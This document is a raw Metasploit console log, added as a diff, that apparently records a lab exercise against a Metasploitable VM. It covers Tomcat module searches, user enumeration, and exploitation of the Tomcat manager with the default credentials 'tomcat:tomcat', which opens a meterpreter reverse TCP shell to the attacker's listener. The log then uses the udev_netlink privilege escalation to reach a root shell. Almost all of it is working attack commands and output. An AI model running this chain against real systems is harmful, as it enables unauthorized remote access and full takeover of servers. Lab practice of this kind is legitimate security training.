@@ -1,0 +1,350 @@
+┌──(kali㉿kali)-[~/Documents/Metasploitable 1/D2/P3]
+└─$ msfconsole 
+                                                  
+
+      .:okOOOkdc'           'cdkOOOko:.
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
+  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
+  lOOOOOOOO.         ;d;         ,OOOOOOOOl
+  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
+   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
+    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
+     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
+      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
+       .dOOo   .OOOOocccxOOOO.   xOOd.
+         ,kOl  .OOOOOOOOOOOOO. .dOk,
+           :kk;.OOOOOOOOOOOOO.cOk:
+             ;kOOOOOOOOOOOOOOOk:
+               ,xOOOOOOOOOOOx,
+                 .lOOOOOOOl.
+                    ,dOd,
+                      .
+
+       =[ metasploit v6.3.4-dev                           ]
++ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
++ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: You can use help to view all 
+available commands
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search tomcat
+
+Matching Modules
+================
+
+   #   Name                                                            Disclosure Date  Rank       Check  Description
+   -   ----                                                            ---------------  ----       -----  -----------
+   0   auxiliary/dos/http/apache_commons_fileupload_dos                2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
+   1   exploit/multi/http/struts_dev_mode                              2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
+   2   exploit/multi/http/struts2_namespace_ognl                       2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
+   3   exploit/multi/http/struts_code_exec_classloader                 2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
+   4   auxiliary/admin/http/tomcat_ghostcat                            2020-02-20       normal     Yes    Apache Tomcat AJP File Read
+   5   exploit/windows/http/tomcat_cgi_cmdlineargs                     2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
+   6   exploit/multi/http/tomcat_mgr_deploy                            2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
+   7   exploit/multi/http/tomcat_mgr_upload                            2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
+   8   auxiliary/dos/http/apache_tomcat_transfer_encoding              2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
+   9   auxiliary/scanner/http/tomcat_enum                                               normal     No     Apache Tomcat User Enumeration
+   10  exploit/linux/local/tomcat_ubuntu_log_init_priv_esc             2016-09-30       manual     Yes    Apache Tomcat on Ubuntu Log Init Privilege Escalation
+   11  exploit/multi/http/atlassian_confluence_webwork_ognl_injection  2021-08-25       excellent  Yes    Atlassian Confluence WebWork OGNL Injection
+   12  exploit/windows/http/cayin_xpost_sql_rce                        2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
+   13  exploit/multi/http/cisco_dcnm_upload_2019                       2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
+   14  exploit/linux/http/cisco_hyperflex_hx_data_platform_cmd_exec    2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform Command Execution
+   15  exploit/linux/http/cisco_hyperflex_file_upload_rce              2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform unauthenticated file upload to RCE (CVE-2021-1499)
+   16  exploit/linux/http/cpi_tararchive_upload                        2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
+   17  exploit/linux/http/cisco_prime_inf_rce                          2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
+   18  post/multi/gather/tomcat_gather                                                  normal     No     Gather Tomcat Credentials
+   19  auxiliary/dos/http/hashcollision_dos                            2011-12-28       normal     No     Hashtable Collisions
+   20  auxiliary/admin/http/ibm_drm_download                           2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
+   21  exploit/linux/http/lucee_admin_imgprocess_file_write            2021-01-15       excellent  Yes    Lucee Administrator imgProcess.cfm Arbitrary File Write
+   22  exploit/linux/http/mobileiron_core_log4shell                    2021-12-12       excellent  Yes    MobileIron Core Unauthenticated JNDI Injection RCE (via Log4Shell)
+   23  exploit/multi/http/zenworks_configuration_management_upload     2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
+   24  exploit/multi/http/spring_framework_rce_spring4shell            2022-03-31       manual     Yes    Spring Framework Class property RCE (Spring4Shell)
+   25  auxiliary/admin/http/tomcat_administration                                       normal     No     Tomcat Administration Tool Default Access
+   26  auxiliary/scanner/http/tomcat_mgr_login                                          normal     No     Tomcat Application Manager Login Utility
+   27  exploit/multi/http/tomcat_jsp_upload_bypass                     2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
+   28  auxiliary/admin/http/tomcat_utf8_traversal                      2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
+   29  auxiliary/admin/http/trendmicro_dlp_traversal                   2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
+   30  post/windows/gather/enum_tomcat                                                  normal     No     Windows Gather Apache Tomcat Enumeration
+
+
+Interact with a module by name or index. For example info 30, use 30 or use post/windows/gather/enum_tomcat
+
+msf6 > use auxiliary/scanner/http/tomcat_enum
+msf6 auxiliary(scanner/http/tomcat_enum) > show options
+
+Module options (auxiliary/scanner/http/tomcat_enum):
+
+   Name              Current Setting                              Required  Description
+   ----              ---------------                              --------  -----------
+   BRUTEFORCE_SPEED  5                                            yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                                        no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                        no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                        no        Add all users in the current database to the list
+   DB_SKIP_EXISTING  none                                         no        Skip existing credentials stored in the current database (Accepted: none, user
+                                                                            , user&realm)
+   PASSWORD                                                       no        A specific password to authenticate with
+   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                                                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
+                                                                            cs/using-metasploit.html
+   RPORT             8080                                         yes       The target port (TCP)
+   SSL               false                                        no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI         /admin/j_security_check                      yes       The path of the Apache Tomcat Administration page
+   THREADS           1                                            yes       The number of concurrent threads (max one per host)
+   USERNAME                                                       no        A specific username to authenticate as
+   USER_FILE         /usr/share/metasploit-framework/data/wordli  yes       File containing users, one per line
+                     sts/tomcat_mgr_default_users.txt
+   VERBOSE           true                                         yes       Whether to print output for all attempts
+   VHOST                                                          no        HTTP server virtual host
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/http/tomcat_enum) > set RHOSTS 192.168.122.126
+RHOSTS => 192.168.122.126
+msf6 auxiliary(scanner/http/tomcat_enum) > set TARGETURI /manager
+TARGETURI => /manager
+msf6 auxiliary(scanner/http/tomcat_enum) > run
+
+[*] http://192.168.122.126:8080/manager - Checking j_security_check...
+[-] The connection was refused by the remote host (192.168.122.126:8080).
+[-] http://192.168.122.126:8080/manager - Unable to enumerate users with this URI
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/tomcat_enum) > use exploit/multi/http/tomcat_mgr_deploy
+[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
+msf6 exploit(multi/http/tomcat_mgr_deploy) > show options
+
+Module options (exploit/multi/http/tomcat_mgr_deploy):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   HttpPassword                   no        The password for the specified username
+   HttpUsername                   no        The username to authenticate as
+   PATH          /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT         80               yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.122.31   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/tomcat_mgr_deploy) > set RHOSTS 192.168.122.126
+RHOSTS => 192.168.122.126
+msf6 exploit(multi/http/tomcat_mgr_deploy) > show options
+
+Module options (exploit/multi/http/tomcat_mgr_deploy):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   HttpPassword                   no        The password for the specified username
+   HttpUsername                   no        The username to authenticate as
+   PATH          /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS        192.168.122.126  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT         80               yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.122.31   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/tomcat_mgr_deploy) > set RPORT 8180
+RPORT => 8180
+msf6 exploit(multi/http/tomcat_mgr_deploy) > show options
+
+Module options (exploit/multi/http/tomcat_mgr_deploy):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   HttpPassword                   no        The password for the specified username
+   HttpUsername                   no        The username to authenticate as
+   PATH          /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS        192.168.122.126  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT         8180             yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.122.31   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/tomcat_mgr_deploy) > exploit
+
+[*] Started reverse TCP handler on 192.168.122.31:4444 
+[*] Attempting to automatically select a target...
+[-] Failed: Error requesting /manager/serverinfo
+[-] Exploit aborted due to failure: no-target: Unable to automatically select a target
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/http/tomcat_mgr_deploy) > set HttpPassword tomcat
+HttpPassword => tomcat
+msf6 exploit(multi/http/tomcat_mgr_deploy) > set HttpUsername tomcat
+HttpUsername => tomcat                                                                                                                                      
+msf6 exploit(multi/http/tomcat_mgr_deploy) > exploit
+                                                                                                                                                            
+[*] Started reverse TCP handler on 192.168.122.31:4444                                                                                                      
+[*] Attempting to automatically select a target...                                                                                                          
+[*] Automatically selected target "Linux x86"                                                                                                               
+[*] Uploading 6225 bytes as hvBCnoFtWcAQWCCA.war ...                                                                                                        
+[*] Executing /hvBCnoFtWcAQWCCA/3pTg.jsp...
+[*] Undeploying hvBCnoFtWcAQWCCA ...
+[*] Sending stage (58829 bytes) to 192.168.122.126
+[*] Meterpreter session 1 opened (192.168.122.31:4444 -> 192.168.122.126:50139) at 2023-08-24 20:24:47 +0100
+
+meterpreter > getuid
+Server username: tomcat55
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(multi/http/tomcat_mgr_deploy) > search udev
+
+Matching Modules
+================
+
+   #  Name                              Disclosure Date  Rank   Check  Description
+   -  ----                              ---------------  ----   -----  -----------
+   0  exploit/linux/local/udev_netlink  2009-04-16       great  No     Linux udev Netlink Local Privilege Escalation
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/local/udev_netlink
+
+msf6 exploit(multi/http/tomcat_mgr_deploy) > use exploit/linux/local/udev_netlink
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+msf6 exploit(linux/local/udev_netlink) > show options
+
+Module options (exploit/linux/local/udev_netlink):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   NetlinkPID                   no        Usually udevd pid-1.  Meterpreter sessions will autodetect
+   SESSION                      yes       The session to run this module on
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.122.31   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(linux/local/udev_netlink) > set SESSION 1
+SESSION => 1
+msf6 exploit(linux/local/udev_netlink) > sessions -i
+
+Active sessions
+===============
+
+  Id  Name  Type                    Information                Connection
+  --  ----  ----                    -----------                ----------
+  1         meterpreter java/linux  tomcat55 @ metasploitable  192.168.122.31:4444 -> 192.168.122.126:50139 (192.168.122.126)
+
+msf6 exploit(linux/local/udev_netlink) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > cat /proc/net/netlink
+sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
+f7c50600 0   0      00000000 0        0        00000000 2
+f7d27a00 4   0      00000000 0        0        00000000 2
+df80a200 7   0      00000000 0        0        00000000 2
+f7d6c600 9   0      00000000 0        0        00000000 2
+f7d42c00 10  0      00000000 0        0        00000000 2
+f7c50a00 15  0      00000000 0        0        00000000 2
+df82fa00 15  2707   00000001 0        0        00000000 2
+f7d40200 16  0      00000000 0        0        00000000 2
+f7475800 18  0      00000000 0        0        00000000 2
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(linux/local/udev_netlink) > set NetlinkPID 2707
+NetlinkPID => 2707
+msf6 exploit(linux/local/udev_netlink) > exploit
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session architecture: java
+[!]  * missing Meterpreter features: stdapi_fs_chmod
+[*] Started reverse TCP handler on 192.168.122.31:4444 
+[+] Found netlink pid: 2707
+[*] Writing payload executable (207 bytes) to /tmp/fyMZhaECyR
+[*] Writing exploit executable (1879 bytes) to /tmp/uIzVCdWmhm
+[*] chmod'ing and running it...
+[*] Sending stage (1017704 bytes) to 192.168.122.126
+[*] Meterpreter session 2 opened (192.168.122.31:4444 -> 192.168.122.126:52377) at 2023-08-24 20:29:27 +0100
+
+meterpreter > getuid
+Server username: root
+meterpreter > shell
+Process 5690 created.
+Channel 1 created.
+hostname && id
+metasploitable
+uid=0(root) gid=0(root)
+^C
+Terminate channel 1? [y/N]  y
+meterpreter > exit
+[*] Shutting down Meterpreter...
+
+[*] 192.168.122.126 - Meterpreter session 2 closed.  Reason: Died
+msf6 exploit(linux/local/udev_netlink) > 
